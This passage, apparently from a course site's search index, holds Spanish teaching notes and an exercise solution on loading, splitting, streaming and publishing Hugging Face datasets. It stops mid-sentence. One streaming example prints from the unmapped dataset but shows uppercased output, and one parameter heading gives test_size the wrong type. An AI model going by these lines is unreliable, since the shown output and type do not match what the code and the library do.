{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Apuntes y ejercicios pr\u00e1cticas del curso de especializaci\u00f3n en Inteligencia Artificial y Big Data","text":"<p>Apuntes, pr\u00e1cticas y ejercicios del curso de especializaci\u00f3n en Inteligencia Artificial y Big Data en el IES Severo Ochoa (Elche).</p> <p>Los ejercicios y conocimientos contenidos en las pr\u00e1cticas y/o apuntes de  todos los m\u00f3dulos tienen exclusivamente prop\u00f3sito formativo, por lo que  nunca se deber\u00e1n utilizar con fines maliciosos o delictivos.</p> <p>Ning\u00fan alumno o alumna de este curso, ni profesor o profesora como  docentes, ser\u00e1n responsables de los da\u00f1os directos o indirectos que  pudieran derivarse del uso inadecuado de las herramientas y mecanismos  expuestos.</p>"},{"location":"Datasets/Actividad1/","title":"Actividad 1 - Datasets de Hugging Face","text":""},{"location":"Datasets/Actividad1/#2-reto-gamificado-publica-tu-primer-dataset-en-hugging-face","title":"2\ufe0f\u20e3 Reto Gamificado: Publica tu primer Dataset en Hugging Face","text":""},{"location":"Datasets/Actividad1/#objetivo","title":"\ud83c\udfaf Objetivo","text":"<p>Aprender a trabajar con datasets en Hugging Face, realizar transformaciones y publicar un dataset en el Hugging Face Hub.</p>"},{"location":"Datasets/Actividad1/#niveles-del-reto","title":"\ud83d\udd79\ufe0f Niveles del reto","text":"<ol> <li>Descarga y explora: Cargar <code>SquadES</code>.</li> <li>Divide en train/test: Crear split adicional.</li> <li>A\u00f1ade columna: <code>num_paragraphs</code>.</li> <li>Filtra y persiste: Guardar en Parquet.</li> <li>Publica en Hugging Face: A\u00f1adir documentaci\u00f3n.</li> </ol>"},{"location":"Datasets/Actividad1/#plantilla-del-ejercicio","title":"\ud83d\udcc2 Plantilla del ejercicio","text":"<pre><code>from datasets import load_dataset\n\n# Nivel 1: Descargar y explorar\ndataset = load_dataset(\"PlanTL-GOB-ES/squad-es\")\nprint(dataset)\n\n# Nivel 2: Dividir en train/test\ntrain_dataset = dataset[\"train\"]\nsplit_dataset = train_dataset.train_test_split(test_size=0.2)\ntrain_split = split_dataset[\"train\"]\ntest_split = split_dataset[\"test\"]\n\n# Nivel 3: A\u00f1adir columna con cantidad de p\u00e1rrafos\ndef add_num_paragraphs(example):\n    return {\"num_paragraphs\": len(example[\"paragraphs\"])}\ntrain_split = train_split.map(add_num_paragraphs)\n\n# Nivel 4: Filtrar y persistir\nfiltered_train = train_split.filter(lambda x: x[\"num_paragraphs\"] &gt; 10)\nfiltered_train = filtered_train.remove_columns([\"num_paragraphs\"])\nfiltered_train.to_parquet(\"filtered_train.parquet\")\n\n# Nivel 5: Publicar en Hugging Face\n# filtered_train.push_to_hub(\"usuario/nombre-dataset\")\n</code></pre>"},{"location":"Datasets/Actividad1/#recursos","title":"\ud83d\udd17 Recursos","text":"<ul> <li>Hugging Face Datasets</li> <li>Documentaci\u00f3n oficial</li> </ul>"},{"location":"Datasets/Actividad1_solution/","title":"1. Descargar los datos de SquadES desde fuente remota","text":"<p>El primer paso es cargar los archivos de entrenamiento y validaci\u00f3n desde URLs remotas. Utilizaremos la funci\u00f3n <code>load_dataset()</code> de la librer\u00eda Hugging Face Datasets, indicando que queremos cargar archivos JSON alojados en GitHub. Los datos remotos se corresponden con <code>train-v2.0-es.json</code> (entrenamiento) y <code>dev-v2.0-es.json</code> (validaci\u00f3n).</p> <p><pre><code>from datasets import load_dataset\n\nurl = \"https://raw.githubusercontent.com/ccasimiro88/TranslateAlignRetrieve/master/SQuAD-es-v2.0/\"\ndata_files = {\n    \"train\": url + \"train-v2.0-es.json\",\n    \"val\": url + \"dev-v2.0-es.json\"\n}\nsquad_es = load_dataset(\"json\", data_files=data_files, field=\"data\")  # field=\"data\" porque los datos est\u00e1n bajo esa clave\nprint(squad_es)\n</code></pre> Esto produce un objeto DatasetDict con splits train y val, donde cada elemento tiene las claves title y paragraphs.\u200b</p>"},{"location":"Datasets/Actividad1_solution/#2-dividir-los-datos-de-entrenamiento-en-entrenamiento-y-prueba","title":"2. Dividir los datos de entrenamiento en entrenamiento y prueba","text":"<p>Para realizar una partici\u00f3n del <code>split</code> de entrenamiento en dos partes (por ejemplo, 90% entrenamiento y 10% prueba), usamos el m\u00e9todo <code>train_test_split()</code>:</p> <p><pre><code>squad_train_full = squad_es[\"train\"]\nsplit_dataset = squad_train_full.train_test_split(test_size=0.1, seed=42)\nsquad_train = split_dataset[\"train\"]\nsquad_test = split_dataset[\"test\"]\nprint(squad_train)\nprint(squad_test)\n</code></pre> Ahora disponemos de <code>squad_train</code> (entrenamiento 90%) y <code>squad_test</code> (prueba 10%).\u200b</p>"},{"location":"Datasets/Actividad1_solution/#3-anadir-una-columna-con-el-numero-de-parrafos","title":"3. A\u00f1adir una columna con el n\u00famero de p\u00e1rrafos","text":"<p>Podemos emplear el m\u00e9todo <code>map()</code> para agregar una columna llamada, por ejemplo, <code>num_paragraphs</code>, contando los elementos en la clave <code>paragraphs</code> de cada ejemplo.</p> <p><pre><code>squad_train = squad_train.map(lambda x: {\"num_paragraphs\": len(x[\"paragraphs\"])})\nprint(squad_train.column_names)  # Debe incluir 'num_paragraphs'\nprint(squad_train[0][\"num_paragraphs\"])\n</code></pre> De este modo, cada registro en el <code>split</code> de entrenamiento tiene la columna con el n\u00famero de p\u00e1rrafos.\u200b</p>"},{"location":"Datasets/Actividad1_solution/#4-filtrar-los-ejemplos-con-mas-de-10-parrafos","title":"4. Filtrar los ejemplos con m\u00e1s de 10 p\u00e1rrafos","text":"<p>Usaremos el m\u00e9todo <code>filter()</code>, pasando una funci\u00f3n lambda que conserve solo aquellos ejemplos cuya columna <code>num_paragraphs</code> sea mayor que 10:</p> <p><pre><code>squad_train_large = squad_train.filter(lambda x: x[\"num_paragraphs\"] &gt; 10)\nprint(squad_train_large)\n</code></pre> As\u00ed, el dataset de entrenamiento contiene \u00fanicamente los registros relevantes para el criterio pedido.\u200b</p>"},{"location":"Datasets/Actividad1_solution/#5-eliminar-la-columna-num_paragraphs","title":"5. Eliminar la columna num_paragraphs","text":"<p>Para dejar el dataset limpio, eliminamos la columna extra:</p> <p><pre><code>squad_train_final = squad_train_large.remove_columns(\"num_paragraphs\")\nprint(squad_train_final.column_names)\n</code></pre> Esto deja \u00fanicamente las columnas originales: <code>title</code> y <code>paragraphs</code>.\u200b</p>"},{"location":"Datasets/Actividad1_solution/#6-persistir-el-dataset-en-formato-parquet","title":"6. Persistir el dataset en formato Parquet","text":"<p>El m\u00e9todo to_parquet() permite guardar el dataset resultante en disco en formato Parquet, que es eficiente y compatible para grandes vol\u00famenes de datos.</p> <p><pre><code>squad_train_final.to_parquet(\"squad_train_filtered.parquet\")\n</code></pre> Esto crea el archivo Parquet con los ejemplos filtrados.\u200b</p>"},{"location":"Datasets/Actividad1_solution/#7-publicar-el-dataset-en-hugging-face","title":"7. Publicar el dataset en Hugging Face","text":"<p>Antes de publicar necesitas autenticarte con tu cuenta (aseg\u00farate de tener instalado huggingface_hub y un token de escritura):</p> <p><pre><code>from huggingface_hub import login\nlogin()  # Te pedir\u00e1 el token\n</code></pre> A continuaci\u00f3n, puedes usar el m\u00e9todo <code>push_to_hub</code> del dataset. Opcionalmente, crea primero un <code>DatasetDict</code> si quieres incluir tambi\u00e9n el <code>split</code> de validaci\u00f3n o test:</p> <pre><code>from datasets import DatasetDict\n\nfinal_dataset = DatasetDict({\n    \"train\": squad_train_final,\n    \"test\": squad_test\n})\n</code></pre> <p>Sube el dataset (reemplaza /squad_es_filtrado por tu nombre de usuario/repositorio en Hugging Face) <code>final_dataset.push_to_hub(\"&lt;tu_usuario&gt;/squad_es_filtrado\")</code>"},{"location":"Datasets/Actividad1_solution/#opcionalmente-anade-un-ejemplo-en-la-documentacion-editando-la-dataset-card-en-la-propia-web-de-hugging-face-tal-como-recomienda-la-sesionattached_file1","title":"Opcionalmente, a\u00f1ade un ejemplo en la documentaci\u00f3n editando la \"Dataset Card\" en la propia web de Hugging Face, tal como recomienda la sesi\u00f3n[attached_file:1].","text":"<p>Notas finales - Durante el proceso, imprime ejemplos y utiliza peque\u00f1os prints para comprobar cada paso. - La edici\u00f3n de la tarjeta del dataset (\"Dataset Card\") se realiza desde la web de Hugging Face: ah\u00ed puedes a\u00f1adir un ejemplo, uso previsto y detalles del proceso seguido, favoreciendo la comprensi\u00f3n de terceros usuarios.</p>"},{"location":"Datasets/Actividad1_solution/#recursos","title":"\ud83d\udd17 Recursos","text":"<ul> <li>Hugging Face Datasets</li> <li>Documentaci\u00f3n oficial</li> </ul>"},{"location":"Datasets/Datasets/","title":"\ud83d\udcd8 Hugging Face Datasets: Apuntes + Reto Gamificado","text":""},{"location":"Datasets/Datasets/#1-introduccion","title":"1\ufe0f\u20e3 Introducci\u00f3n","text":"<p>El paquete <code>datasets</code> de Hugging Face es una potente herramienta para acceder, compartir y procesar conjuntos de datos (datasets) de IA para una amplia gama de tareas, que incluyen:</p> <ul> <li>Procesamiento del Lenguaje Natural (PLN)</li> <li>Visi\u00f3n por computador</li> <li>Procesamiento de audio</li> </ul> <p>Est\u00e1 dise\u00f1ado para manejar grandes vol\u00famenes de datos de manera eficiente mediante el uso de mapeo de memoria y el formato Apache Arrow, lo que permite trabajar con datos que superan la RAM disponible.</p> <p>Arrow Apache Arrow define un formato de memoria columnar independiente del lenguaje para datos planos y anidados, organizado para operaciones anal\u00edticas eficientes en hardware moderno como CPU y GPU. El formato de memoria Arrow tambi\u00e9n admite lecturas sin copia para un acceso a datos ultrarr\u00e1pido sin sobrecarga de serializaci\u00f3n.</p> <p>El proyecto del formato Apache Arrow comenz\u00f3 en febrero de 2016, centr\u00e1ndose en cargas de trabajo de an\u00e1lisis columnar en memoria. A diferencia de formatos de archivo como Parquet o CSV, que especifican c\u00f3mo se organizan los datos en el disco, Arrow se centra en c\u00f3mo se organizan los datos en la memoria. </p> <p>Los creadores buscan consolidar Arrow como un formato est\u00e1ndar en memoria para el an\u00e1lisis de cargas de trabajo. Estos fundamentos atraen a numerosos colaboradores de proyectos como Pandas, Spark, Cassandra, Apache Calcite, Dremio e Ibis.</p>"},{"location":"Datasets/Datasets/#caracteristicas-clave","title":"\ud83d\udd11 Caracter\u00edsticas Clave","text":"<ul> <li>Vasto Repositorio (Hub): Gran cantidad de datasets p\u00fablicos y privados.</li> <li>F\u00e1cil Acceso: Carga en una sola l\u00ednea de c\u00f3digo con <code>load_dataset</code>.</li> <li>Procesamiento Eficiente: M\u00e9todos como <code>map()</code> paralelizados.</li> <li>Escalabilidad: Objetos <code>Dataset</code> y <code>IterableDataset</code>.</li> <li>Gesti\u00f3n de Datos: Crear y subir datasets propios al Hub de Hugging    Face.</li> </ul> <p>Los datasets de Hugging Face sirven para:</p>"},{"location":"Datasets/Datasets/#1-acceder-a-datos-listos-para-ia","title":"\u2705 1. Acceder a datos listos para IA","text":"<p>Hugging Face ofrece un repositorio enorme de conjuntos de datos p\u00fablicos y privados para tareas como:</p> <ul> <li>Procesamiento del Lenguaje Natural (PLN)</li> <li>Visi\u00f3n por computadora</li> <li>Audio y multimodalidad</li> </ul>"},{"location":"Datasets/Datasets/#2-facilitar-el-preprocesamiento","title":"\u2705 2. Facilitar el preprocesamiento","text":"<p>Permite aplicar transformaciones como:</p> <ul> <li>Tokenizaci\u00f3n de texto</li> <li>Filtrado y remuestreo</li> <li>Conversi\u00f3n a formatos como Pandas, NumPy, PyTorch y TensorFlow</li> </ul>"},{"location":"Datasets/Datasets/#3-escalabilidad-y-eficiencia","title":"\u2705 3. Escalabilidad y eficiencia","text":"<p>Usa Apache Arrow y mapeo de memoria, lo que permite trabajar con datasets que superan la RAM disponible. Soporta dos tipos:</p> <ul> <li>Dataset (acceso aleatorio r\u00e1pido)</li> <li>IterableDataset (para streaming de datos grandes)</li> </ul>"},{"location":"Datasets/Datasets/#4-compartir-y-colaborar","title":"\u2705 4. Compartir y colaborar","text":"<p>Podemos crear y subir nuestros propios datasets al Hugging Face Hub, con documentaci\u00f3n y ejemplos. Esto fomenta la reproducibilidad y el trabajo en equipo.</p>"},{"location":"Datasets/Datasets/#5-integracion-directa-con-modelos","title":"\u2705 5. Integraci\u00f3n directa con modelos","text":"<p>Los datasets se integran f\u00e1cilmente con transformers y otros frameworks para entrenamiento y evaluaci\u00f3n.</p>"},{"location":"Datasets/Datasets/#instalacion","title":"\u2699\ufe0f Instalaci\u00f3n","text":"<pre><code>pip install datasets\npip install datasets[audio]\npip install datasets[vision]\n</code></pre>"},{"location":"Datasets/Datasets/#ejemplo-cargar-un-dataset-local","title":"\ud83e\udde9 Ejemplo: Cargar un dataset local","text":"<pre><code>from datasets import load_dataset\n\nsquad_dataset = load_dataset(\"json\", data_files=\"train-v2.0-es.json\", field=\"data\")\n\nprint(squad_dataset)\n</code></pre> <p>Salida esperada: <pre><code>DatasetDict({\n    train: Dataset({ features: ['title', 'paragraphs'], num_rows: 442 })\n})\n</code></pre></p>"},{"location":"Datasets/Datasets/#2-reto-gamificado-publica-tu-primer-dataset-en-hugging-face","title":"2\ufe0f\u20e3 Reto Gamificado: Publica tu primer Dataset en Hugging Face","text":""},{"location":"Datasets/Datasets/#objetivo","title":"\ud83c\udfaf Objetivo","text":"<p>Aprender a trabajar con datasets en Hugging Face, realizar transformaciones y publicar un dataset en el Hugging Face Hub.</p> <ol> <li>(RAPIA.3 / CEPIA.3b, CEPIA.3c / 2.5p) Siguiendo el ejemplo inicial trabajado en la sesi\u00f3n y solo empleando Python:<ol> <li>Descarga los datos de SquadES considerando que los datos remotos son los de entrenamiento y validaci\u00f3n.</li> <li>Con los datos de entrenamiento, div\u00eddelos en entrenamiento y pruebas.</li> <li>Tras ello, sobre el dataset de entrenamiento, a\u00f1ade una columna a los datos de entrenamiento con la cantidad de p\u00e1rrafos.</li> <li>Filtra los datos de entrenamiento para que el dataset solo contenga aquellos registros que tienen m\u00e1s de 10 p\u00e1rrafos.</li> <li>Elimina la columna con la cantidad de p\u00e1rrafos.</li> <li>Persiste todo el dataset en formato Parquet.</li> <li>Finalmente, publ\u00edcalo en Hugging Face, editando la tarjeta y poniendo un documento de ejemplo en la documentaci\u00f3n.</li> </ol> </li> </ol>"},{"location":"Datasets/Datasets/#niveles-del-reto","title":"\ud83d\udd79\ufe0f Niveles del reto","text":"<ol> <li>Descarga y explora: Cargar <code>SquadES</code>.</li> <li>Divide en train/test: Crear split adicional.</li> <li>A\u00f1ade columna: <code>num_paragraphs</code>.</li> <li>Filtra y persiste: Guardar en Parquet.</li> <li>Publica en Hugging Face: A\u00f1adir documentaci\u00f3n.</li> </ol>"},{"location":"Datasets/Datasets/#plantilla-del-ejercicio","title":"\ud83d\udcc2 Plantilla del ejercicio","text":"<pre><code>from datasets import load_dataset\n\n# Nivel 1: Descargar y explorar\n\n\n# Nivel 2: Dividir en train/test\n\n\n# Nivel 3: A\u00f1adir columna con cantidad de p\u00e1rrafos\n\n\n# Nivel 4: Filtrar y persistir\n\n# Nivel 5: Publicar en Hugging Face\n</code></pre> <p>Ya hemos visto que podemos utilizar diferentes datasets existentes en la plataforma para re-entrenar nuestros modelos.</p> <p>En esta sesi\u00f3n vamos a estudiar c\u00f3mo crear un dataset a partir de nuestros datos, limpiar un dataset, a reducirlo para que quepa en RAM y como tras crear nuestro dataset, subirlo al Hub.</p>"},{"location":"Datasets/Datasets/#cargando-datos","title":"Cargando datos","text":"<p>Para cargar datos, haremos uso de la funci\u00f3n <code>load_dataset()</code> de la librer\u00eda Datasets. Si fuera necesaria instalarla, mediante <code>pip</code> har\u00edamos:</p> <pre><code>pip install datasets\n</code></pre> <p>Podemos cargar archivos con diferentes formatos indicando el formato y los datos:</p> <pre><code># CSV &amp; TSV\nload_dataset(\"csv\", data_files=\"mis_datos.csv\")\n# Texto\nload_dataset(\"text\", data_files=\"mis_datos.txt\")\n# JSON &amp; JSONL\nload_dataset(\"json\", data_files=\"mis_datos.jsonl\")\n</code></pre> <p>Para este apartado nos vamos a centrar en los datos de SQuAD (Stanford Question Answering Dataset), compuesto de un conjunto de art\u00edculos de Wikipedia, con respuestas a diferentes preguntas sobre los art\u00edculos. En nuestro caso, nos vamos a centrar en una versi\u00f3n en castellano que podemos ver en https://huggingface.co/datasets/squad_es o descargarlo de desde https://github.com/ccasimiro88/TranslateAlignRetrieve/tree/master/SQuAD-es-v2.0.</p> <p>Si descargamos los archivos y los colocamos en la misma carpeta que el siguiente script, podemos realizar una carga local de los datos:</p> <p>squad-es-local.py <pre><code>from datasets import load_dataset\n\nsquad_dataset = load_dataset(\"json\", data_files=\"train-v2.0-es.json\", field=\"data\")\n\nprint(squad_dataset)\n</code></pre></p> <p>Tras ejecutarlo, nos muestra que al cargar el dataset ha creado un split para train, con la cantidad de filas y las columnas contenidas dentro de un <code>DatasetDict</code>:</p> <pre><code>Generating train split: 442 examples [00:00, 1211.02 examples/s]\nDatasetDict({\n    train: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 442\n    })\n})\n</code></pre> <p>Si queremos obtener m\u00e1s informaci\u00f3n, podemos mostrar las caracter\u00edsticas:</p> <pre><code>print(squad_dataset[\"train\"].features)\n# {'title': Value(dtype='string', id=None),\n#  'paragraphs': [\n#     {'context': Value(dtype='string', id=None),\n#      'qas': [\n#         {'answers': [{'answer_start': Value(dtype='int64', id=None), 'text': Value(dtype='string', id=None)}],\n#          'id': Value(dtype='string', id=None),\n#          'is_impossible': Value(dtype='bool', id=None),\n#          'plausible_answers': [{'answer_start': Value(dtype='int64', id=None), 'text': Value(dtype='string', id=None)}],\n#          'question': Value(dtype='string', id=None)}]\n#     }\n#  ]\n# }\n</code></pre> <p>Y al tratarse de un diccionario, podemos navegar mediante los corchetes para, por ejemplo, recuperar parte de los datos:</p> <pre><code>print(squad_dataset[\"train\"][0][\"title\"])\n# Beyonc\u00e9 Knowles\nprint(squad_dataset[\"train\"][0][\"paragraphs\"][0])\n# {'context': 'Beyonc\u00e9 Giselle Knowles-Carter (nacida el 4 de septiembre de 1981)..',\n # 'qas': [\n    # {'answers': [{'answer_start': 246, 'text': 'a finales de 1990'}],\n    #  'id': '56be85543aeaaa14008c9063', 'is_impossible': False, 'plausible_answers': None, 'question': '\u00bfCu\u00e1ndo Beyonce comenz\u00f3 a ser popular?'},\n    # {'answers': ...\n</code></pre> <p>Cuando cargamos un dataset, realmente queremos cargar los datos de entrenamiento y los de validaci\u00f3n. Para ello, le pasaremos un diccionario con los diferentes archivos para <code>train</code> y para <code>val</code>:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json\", \"val\": \"dev-v2.0-es.json\"}\nsquad_dataset_train = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\n</code></pre> <p>Obteniendo:</p> <pre><code>DatasetDict({\n    train: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 442\n    })\n    val: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 35\n    })\n})\n</code></pre> <p>Si queremos cargar \u00fanicamente una de las partes, le pasaremos el par\u00e1metro <code>split</code> con el valor deseado:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json\", \"val\": \"dev-v2.0-es.json\"}\nsquad_dataset_train = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\", split=\"train\")\nprint(squad_dataset_train)\n</code></pre> <p>Si el dataset est\u00e1 en un archivo comprimido en gzip, zip o tar, la librer\u00eda descomprimir\u00e1 los datos autom\u00e1ticamente:</p> <pre><code>ficheros_datos = {\"train\": \"train-v2.0-es.json.zip\", \"val\": \"dev-v2.0-es.json.zip\"}\nsquad_dataset_trainval = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\nprint(squad_dataset_trainval)\n</code></pre>"},{"location":"Datasets/Datasets/#carga-remota","title":"Carga remota","text":"<p>Si el dataset est\u00e1 almacenado en una URL remota, podemos cargarlos directamente:</p> <p>squad-es-remoto.py <pre><code>from datasets import load_dataset\n\nurl = \"https://raw.githubusercontent.com/ccasimiro88/TranslateAlignRetrieve/master/SQuAD-es-v2.0/\"\n\nficheros_datos = {\n    \"train\": url + \"train-v2.0-es.json\",\n    \"val\": url + \"dev-v2.0-es.json\",\n}\nsquad_remote_dataset = load_dataset(\"json\", data_files=ficheros_datos, field=\"data\")\n\nprint(squad_remote_dataset)\n</code></pre></p>"},{"location":"Datasets/Datasets/#dividiendo-el-dataset","title":"Dividiendo el dataset","text":"<p>Si en vez de cargar por separado los datos de entrenamiento y los de test, tenemos un \u00fanico conjunto de datos, podemos dividirlo mediante el m\u00e9todo <code>Dataset.train_test_split()</code> indicando el tama\u00f1o, por ejemplo, de los datos de test:</p> <p>squad-es-split.py <pre><code>from datasets import load_dataset\n\nsquad_dataset = load_dataset(\"json\", data_files=\"train-v2.0-es.json\", field=\"data\", split=\"train\")\nsquad_split_dataset = squad_dataset.train_test_split(test_size=0.1)\nprint(squad_split_dataset)\n</code></pre></p>"},{"location":"Datasets/Datasets/#tamano-de-la-division-de-prueba-test_size-numpyrandomgenerator-opcional","title":"Tama\u00f1o de la divisi\u00f3n de prueba: <code>test_size (numpy.random.Generator, opcional)</code>","text":"<ul> <li>Si es <code>float</code>, debe estar entre 0.0 y 1.0 y representar la proporci\u00f3n del conjunto de datos que se incluir\u00e1 en la divisi\u00f3n de prueba. Si es int, representa el n\u00famero absoluto de muestras de prueba. </li> <li>Si es <code>None</code>, el valor se establece en el complemento del tama\u00f1o de entrenamiento.    Si <code>train_size</code> tambi\u00e9n es <code>None</code>, se establecer\u00e1 en 0.25.</li> </ul> <p>De manera que pasamos de un dataset de 442 filas a uno dividido en 397 para entrenamiento y 45 para test:</p> <pre><code>DatasetDict({\n    train: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 397\n    })\n    test: Dataset({\n        features: ['title', 'paragraphs'],\n        num_rows: 45\n    })\n})\n</code></pre>"},{"location":"Datasets/Datasets/#cargando-en-pandas","title":"Cargando en Pandas","text":"<p>Si estamos trabajando con Pandas y queremos cargar un archivo que est\u00e1 en un dataset de Hugging Face, podemos utilizar la librer\u00eda de <code>huggingface_hub</code> para crear, eliminar, actualizar y recuperar informaci\u00f3n de los repositorios.</p> <p>Por ejemplo, para cargar un dataset CSV con Pandas podr\u00edamos hacer:</p> <p>cargando_en_pandas.py <pre><code>from huggingface_hub import hf_hub_download\nimport pandas as pd\n\nREPO_ID = \"aitor-medrano/iabd\"\nFICHERO = \"cp_train.csv\"\n\ndataset = pd.read_csv(\n    hf_hub_download(repo_id=REPO_ID, filename=FICHERO, repo_type=\"dataset\")\n)\nprint(dataset)\n# &lt;class 'pandas.core.frame.DataFrame'&gt;\n# RangeIndex: 3214 entries, 0 to 3213\n# Data columns (total 3 columns):\n#  #   Column   Non-Null Count  Dtype  \n# ---  ------   --------------  -----  \n#  0   formula  3214 non-null   object \n#  1   T        3214 non-null   float64\n#  2   Cp       3214 non-null   float64\n# dtypes: float64(2), object(1)\n# memory usage: 75.5+ KB\n</code></pre></p>"},{"location":"Datasets/Datasets/#cargando-en-streaming","title":"Cargando en streaming","text":"<p>Si el dataset ocupa varios gigas, con modelos como BERT o GPT, puede que no quepan en memoria RAM. Para ello, la librer\u00eda datasets gestiona los datos como ficheros mapeados en memoria realizando un streaming de los datos.</p> Streaming de un dataset - https://huggingface.co/docs/datasets/stream <p>Para este apartado, vamos a utilizar parte de un dataset con c\u00f3digo encontrado en GitHub de los diferentes lenguajes de programaci\u00f3n, conocido como BigCode.</p> <p>Gated dataset</p> <p>El dataset de BigCode est\u00e1 configurado para pedir las credenciales de los usuarios que los utilizan. Esto se conoce como un Gated dataset. Es por ello que tenemos que hacer login en Hugging Face antes de poder descargarlo.</p> <p>En nuestro caso, nos vamos a centrar en archivos <code>DockerFile</code> para que el dataset sea asumible (alrededor de 1Gb). As\u00ed pues, cargamos los datos:</p> <p>cargando_en_streaming.py <pre><code>from datasets import load_dataset\n\nbigcode_dataset = load_dataset(\"bigcode/the-stack-v2\", \"Dockerfile\", split=\"train\")\nprint(bigcode_dataset)\n# Dataset({\n#     features: ['blob_id', 'directory_id', 'path', 'content_id', 'detected_licenses', 'license_type', 'repo_name', 'snapshot_id', 'revision_id', 'branch_name', 'visit_date', 'revision_date', 'committer_date', 'github_id', 'star_events_count', 'fork_events_count', 'gha_license_id', 'gha_event_created_at', 'gha_created_at', 'gha_language', 'src_encoding', 'language', 'is_vendor', 'is_generated', 'length_bytes', 'extension'],\n#     num_rows: 4155925\n# })\n</code></pre></p> <p>Y el contenido de un documento:</p> <pre><code>{\n   \"blob_id\":\"a29dd2b33082d2b98541c66ba3620ae054991503\",\n   \"directory_id\":\"71568d223947f51cb007a8564e5f808e0987779e\",\n   \"path\":\"/src/Dapr/GameServer.Host/Dockerfile\",\n   \"content_id\":\"072b3138be512a71cf4e8bbbdb657497e808d2f6\",\n   \"detected_licenses\":[\n      \"MIT\",\n      \"LicenseRef-scancode-unknown-license-reference\"\n   ],\n   \"license_type\":\"permissive\",\n   \"repo_name\":\"devblack/OpenMU\",\n   \"snapshot_id\":\"8cdc521178da47c9c7d2daa502dc71688835fd0a\",\n   \"revision_id\":\"1064b0dca1a491bc28f325e42ca6b97d406d6558\",\n   \"branch_name\":\"refs/heads/master\",\n   \"visit_date\":Timestamp(\"2023-04-07 10:56:30.043316\"),\n   \"revision_date\":Timestamp(\"2023-03-17 20:32:25\"),\n   \"committer_date\":Timestamp(\"2023-03-17 20:32:25\"),\n   \"github_id\":None,\n   \"star_events_count\":0,\n   \"fork_events_count\":0,\n   \"gha_license_id\":None,\n   \"gha_event_created_at\":None,\n   \"gha_created_at\":None,\n   \"gha_language\":None,\n   \"src_encoding\":\"UTF-8\",\n   \"language\":\"Dockerfile\",\n   \"is_vendor\":false,\n   \"is_generated\":false,\n   \"length_bytes\":709,\n   \"extension\":\"\"\n}\n</code></pre> <p>Si ahora cargamos el dataset mediante streaming, pas\u00e1ndole el par\u00e1metros <code>streaming=True</code>, en vez de recuperar un Dataset, obtendremos un <code>IterableDataset</code>:</p> <pre><code>from datasets import load_dataset\n\nstreaming_dataset = load_dataset(\"bigcode/the-stack-v2\", \"Dockerfile\", split=\"train\", streaming=True)\nprint(streaming_dataset)\n# Resolving data files: 100%|\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 976/976 [00:00&lt;00:00, 1064.36it/s]\n# IterableDataset({\n#     features: ['blob_id', 'directory_id', 'path', 'content_id', 'detected_licenses', 'license_type', 'repo_name', 'snapshot_id', 'revision_id', 'branch_name', 'visit_date', 'revision_date', 'committer_date', 'github_id', 'star_events_count', 'fork_events_count', 'gha_license_id', 'gha_event_created_at', 'gha_created_at', 'gha_language', 'src_encoding', 'language', 'is_vendor', 'is_generated', 'length_bytes', 'extension'],\n#     n_shards: 1\n# })\n</code></pre> <p>Como sugiere el nombre, para acceder a los elementos del <code>IterableDataset</code> necesitamos iterar sobre \u00e9l:</p> <pre><code>print(next(iter(streaming_dataset)))\n</code></pre> <p>Los elementos de un dataset en streaming  se pueden procesar al vuelo mediante la funci\u00f3n <code>map</code> o <code>filter</code>. Por ejemplo, para pasar a may\u00fasculas el campo <code>license_type</code> har\u00edamos:</p> <pre><code>def mayusLicencias(registro):\n    registro[\"license_type\"] = registro[\"license_type\"].upper()\n    return registro\n\nmapped_dataset = streaming_dataset.map(mayusLicencias)\n\nprint(next(iter(streaming_dataset)))\n# ... 'detected_licenses': ['MIT', ...], 'license_type': 'PERMISSIVE', 'repo_name': 'devblack/OpenMU' ...\n</code></pre> <p>Al vuelo</p> <p>Debemos tener en cuenta que la transformaci\u00f3n se realizar\u00e1 al recorrer el dataset, no al invocar a los m\u00e9todos <code>map</code> o <code>filter</code>.</p> <p>Otras opciones son utilizar las operaciones <code>take()</code>, <code>shuffle()</code> o <code>skip()</code> dentro del <code>IterableDataset</code> para trabajar con muestras peque\u00f1as de los datos cargados:</p> <pre><code>muestra = streaming_dataset.take(100)\nmuestra_aleatoria = streaming_dataset.shuffle(seed=42, buffer_size=1000).take(500)\nrango = streaming_dataset.skip(1000).take(100)\n</code></pre> <p>M\u00e1s informaci\u00f3n en https://huggingface.co/docs/datasets/stream y https://huggingface.co/docs/datasets/about_mapstyle_vs_iterable.</p>"},{"location":"Datasets/Datasets/#limpiando","title":"Limpiando","text":"<p>De forma similar a Pandas o Spark, podemos manipular el contenido de los objetos <code>Dataset</code>.</p> <p>El primer paso deber\u00eda ser barajar los datos para desordenarlos y coger una muestra. Para ello, emplearemos <code>Dataset.shuffle()</code>:</p> <pre><code>squad_train = squad_dataset_trainval[\"train\"]\nprint(squad_train[0][\"title\"]) # Beyonc\u00e9 Knowles\n\nsquad_train_shuffled = squad_train.shuffle(seed=333)\nprint(squad_train_shuffled[0][\"title\"]) # Carnaval\n</code></pre>"},{"location":"Datasets/Datasets/#por-que-se-usa-seed-semilla-fija-de-333-en-el-metodo-suffle","title":"\u00bfPor qu\u00e9 se usa seed (semilla) fija de 333 en el m\u00e9todo suffle()?","text":"<p><pre><code>squad_train_shuffled = squad_train.shuffle(seed=333)\n</code></pre> Se usa una semilla fija (seed) en el m\u00e9todo shuffle() para garantizar reproducibilidad.</p> <p>\u2705 \u00bfQu\u00e9 significa esto?</p> <ul> <li>Cuando barajas datos, el orden resultante depende de un generador aleatorio.</li> <li>Si no se fija una semilla, cada ejecuci\u00f3n produce un orden distinto.</li> <li>Al establecer 